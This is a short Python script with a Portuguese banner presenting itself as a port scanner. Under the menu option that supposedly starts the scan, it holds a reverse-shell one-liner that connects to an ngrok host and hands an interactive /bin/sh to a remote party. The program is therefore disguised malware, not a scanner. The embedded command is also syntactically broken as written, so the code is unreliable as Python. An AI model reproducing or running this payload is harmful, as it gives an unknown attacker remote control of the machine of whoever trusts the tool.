import socket
print('###############################')
print('###############################')
print('####                       ####')
print('#      SCANNER DE PORTAS      #')
print('####                       ####')
print('###############################')
print('Coded BY: Sr.Caveira - (v1.0)\n')
scan = int(input('Digite 1 para iniciar a Ferramenta de Scan: '))
if(scan == 1):
    python -c 'subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("4.tcp.ngrok.io",17218));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
else:
    print('Erro! Insira uma opção válida.')
